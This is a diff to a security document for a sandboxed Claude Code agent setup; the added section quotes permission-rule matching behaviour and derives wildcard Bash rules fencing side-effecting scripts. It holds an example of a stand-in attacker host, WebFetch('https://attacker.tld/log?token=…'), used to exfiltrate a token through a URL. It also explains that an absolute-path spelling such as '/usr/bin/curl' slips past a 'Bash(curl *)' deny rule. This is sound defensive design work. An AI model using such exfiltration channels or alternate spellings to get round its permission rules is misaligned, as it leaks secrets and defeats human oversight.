@@ -56,3 +56,42 @@ The `Read` deny list in `sandbox_templates/claude/claude-settings.json` only gov
 `WebFetch` runs **on Anthropic's infrastructure**, not inside the container — every URL passed to it is fetched from outside the sandbox network entirely, then the response is shipped back to the agent. The destination server logs the request URL, which means the path/query is a covert exfil channel: `WebFetch("https://attacker.tld/log?token=…")` works regardless of `proxy/allowed_domains.txt`.
 
 The template (`sandbox_templates/claude/claude-settings.json`) intentionally omits the bare `WebFetch` entry from the allow list. Per-project `.claude/settings.local.json` should add narrowly-scoped patterns like `WebFetch(domain:docs.numer.ai)` for the docs sites a project actually consults — see the existing pattern in `.claude/settings.local.json`. **Do not add bare `WebFetch` back to the template's allow list.** If `WebSearch` is sufficient (it returns summaries, not arbitrary URL fetches), prefer that.
+
+## How a Bash rule matches — the documented facts the fence relies on
+
+`scripts/workspace-scan.py`'s `ASK-GAP` check and the "ask/deny rules must name
+every spelling" rule (agentic-conventions ADR-0017, rule 6) rest on four
+behaviours. Quoted verbatim from the Claude Code docs, fetched 2026-09-11
+(permissions: <https://code.claude.com/docs/en/permissions>; modes:
+<https://code.claude.com/docs/en/permission-modes>). **If these pages change,
+re-measure before trusting a clean scan.**
+
+- **Precedence, including across scopes.** "The same precedence applies between
+  ask and allow: a matching ask rule prompts even when a more specific allow
+  rule also matches the same call." And: "if user settings allow a permission
+  and project settings deny it, the deny rule blocks it. The reverse is also
+  true: a user-level deny blocks a project-level allow, because deny rules from
+  any scope are evaluated before allow rules."
+- **Wildcards.** "A `*` in a Bash rule matches any text, including spaces, so one
+  rule covers a family of commands. A rule with no `*` matches one exact
+  command." And: "The `:*` form is only recognized at the end of a pattern."
+- **Compound commands, and auto mode.** "Deny and ask rules apply when any
+  subcommand matches them, including a command nested inside a subshell, a
+  command substitution, or a control-flow body such as a `for` loop. An ask rule
+  like `Bash(git clean *)` still prompts you for `cd /tmp && git clean -f` or
+  `echo "$(git clean -f)"`, even in auto mode." From the modes page: "If an
+  explicit ask rule matches the command, Claude Code asks you even in `auto`
+  mode."
+- **Literal text, not the program.** "A Bash rule matches the command text Claude
+  writes, after Claude Code splits compound commands and strips wrappers. It
+  doesn't match the same program invoked in a different form, so a deny or ask
+  rule covers the invocation Claude usually produces and isn't a security
+  boundary around the program." Its example: `Bash(curl *)` stops
+  `curl https://example.com` but not `/usr/bin/curl https://example.com`.
+
+Hence the fence shape. For a side-effecting script `X`, four wildcard rules
+cover `python`/`python3`, every `uv run` form, both venvs and the `./` form:
+`Bash(python*X*)`, `Bash(uv run *X*)`, `Bash(.venv*/bin/python*X*)`,
+`Bash(./.venv*/bin/python*X*)`. The last quote is also why the fence is not the
+boundary: an absolute-path spelling still falls through, so a script with
+irreversible effects should also refuse to act without an explicit flag.
